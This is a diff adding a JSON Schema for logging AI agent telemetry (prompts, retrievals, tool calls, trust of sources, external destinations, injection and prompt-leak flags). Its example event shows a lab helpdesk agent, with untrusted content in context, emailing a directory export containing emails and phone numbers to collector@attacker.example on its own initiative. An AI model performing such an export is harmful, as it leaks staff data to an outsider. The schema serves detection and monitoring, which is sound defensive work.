@@ -1,0 +1,131 @@
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "title": "AI agent telemetry event",
+  "description": "One event per step of an agent session: user prompt, retrieval, model call, tool call or tool result. Fields marked as computed are set by the logging wrapper, not by the model.",
+  "type": "object",
+  "required": ["@timestamp", "event", "session", "user", "agent"],
+  "properties": {
+    "@timestamp": { "type": "string", "format": "date-time" },
+    "event": {
+      "type": "object",
+      "required": ["id", "type", "sequence"],
+      "properties": {
+        "id": { "type": "string" },
+        "type": {
+          "enum": ["user_prompt", "retrieval", "model_request", "model_response", "tool_call", "tool_result", "session_end"]
+        },
+        "sequence": { "type": "integer", "minimum": 0, "description": "Order of the event within the session" },
+        "outcome": { "enum": ["success", "failure", "blocked"] }
+      }
+    },
+    "session": {
+      "type": "object",
+      "required": ["id"],
+      "properties": {
+        "id": { "type": "string" },
+        "turn_id": { "type": "string", "description": "Changes with every new user prompt" }
+      }
+    },
+    "user": {
+      "type": "object",
+      "required": ["id"],
+      "properties": {
+        "id": { "type": "string" },
+        "role": { "type": "string" }
+      }
+    },
+    "agent": {
+      "type": "object",
+      "required": ["name"],
+      "properties": {
+        "name": { "type": "string" },
+        "version": { "type": "string" },
+        "environment": { "enum": ["lab", "test", "production"] },
+        "prompt_mode": { "enum": ["strict", "loose"] }
+      }
+    },
+    "model": {
+      "type": "object",
+      "properties": {
+        "provider": { "type": "string" },
+        "name": { "type": "string" },
+        "input_tokens": { "type": "integer", "minimum": 0 },
+        "output_tokens": { "type": "integer", "minimum": 0 },
+        "latency_ms": { "type": "integer", "minimum": 0 }
+      }
+    },
+    "content": {
+      "type": "object",
+      "properties": {
+        "origin": { "enum": ["user", "system", "retrieved_document", "tool_output", "model"] },
+        "text": { "type": "string", "description": "Truncated to a safe length before logging" },
+        "length_chars": { "type": "integer", "minimum": 0 },
+        "sha256": { "type": "string" },
+        "truncated": { "type": "boolean" }
+      }
+    },
+    "retrieval": {
+      "type": "object",
+      "properties": {
+        "source": { "type": "string" },
+        "document_id": { "type": "string" },
+        "chunk_id": { "type": "string" },
+        "trust": { "enum": ["trusted", "untrusted"], "description": "Documents anyone can edit are untrusted" }
+      }
+    },
+    "tool": {
+      "type": "object",
+      "properties": {
+        "name": { "type": "string" },
+        "arguments": { "type": "object" },
+        "status": { "enum": ["success", "error", "denied"] },
+        "duration_ms": { "type": "integer", "minimum": 0 },
+        "result_size_bytes": { "type": "integer", "minimum": 0 },
+        "triggered_by": {
+          "enum": ["user_request", "model_initiative"],
+          "description": "Computed: model_initiative when the call was not asked for in the latest user prompt"
+        },
+        "untrusted_content_in_context": {
+          "type": "boolean",
+          "description": "Computed: true if untrusted retrieved or tool content entered the context since the last user prompt"
+        }
+      }
+    },
+    "destination": {
+      "type": "object",
+      "properties": {
+        "domain": { "type": "string" },
+        "external": { "type": "boolean", "description": "Computed: true if the domain is outside the corporate allow-list" }
+      }
+    },
+    "flags": {
+      "type": "object",
+      "description": "Computed by cheap pattern checks in the wrapper; detections in the SIEM do the real correlation",
+      "properties": {
+        "injection_patterns": { "type": "array", "items": { "type": "string" } },
+        "pii_types": { "type": "array", "items": { "type": "string" } },
+        "system_prompt_leak_suspected": { "type": "boolean" }
+      }
+    }
+  },
+  "examples": [
+    {
+      "@timestamp": "2026-10-26T09:14:07.412Z",
+      "event": { "id": "evt_0042", "type": "tool_call", "sequence": 7, "outcome": "success" },
+      "session": { "id": "sess_a1f3", "turn_id": "turn_3" },
+      "user": { "id": "u_demo_01", "role": "employee" },
+      "agent": { "name": "helpdesk-agent", "version": "0.1.0", "environment": "lab" },
+      "tool": {
+        "name": "send_email",
+        "arguments": { "to": "collector@attacker.example", "subject": "Directory export" },
+        "status": "success",
+        "duration_ms": 31,
+        "result_size_bytes": 0,
+        "triggered_by": "model_initiative",
+        "untrusted_content_in_context": true
+      },
+      "destination": { "domain": "attacker.example", "external": true },
+      "flags": { "injection_patterns": [], "pii_types": ["email", "phone"] }
+    }
+  ]
+}
